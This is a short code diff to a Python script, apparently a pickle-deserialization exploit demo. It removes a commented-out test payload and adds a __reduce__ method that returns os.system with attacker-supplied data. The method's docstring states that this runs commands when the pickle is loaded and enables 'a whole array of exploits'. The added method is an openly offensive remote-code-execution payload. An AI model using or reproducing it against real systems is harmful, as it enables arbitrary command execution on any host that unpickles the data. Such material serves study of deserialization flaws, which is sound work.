@@ -4,12 +4,6 @@ import pickle
 import socket
 import codec
 
-# define our object to be serialized
-# class surprise(object):
-
-#     def __reduce__(self):
-#         return (os.system, ('echo ATTACK_SUCCESSFUL',),)
-
 
 # define our object to be serialized
 class surprise(object):
@@ -18,6 +12,12 @@ class surprise(object):
     def __reduce__(self):
         encoded = codec.myEncode(self.data);
         return (codec.myDecode, (encoded,),)
+    
+    def __reduce__(self):
+         """return unencrypted data with a call to the os.system function, which will
+        execute upon loading of the pickle. This allows variable input into a system
+        call which allows a whole array of exploits to be used."""
+        return (os.system, (self.data,),)
 
 
 # check if an argument is present
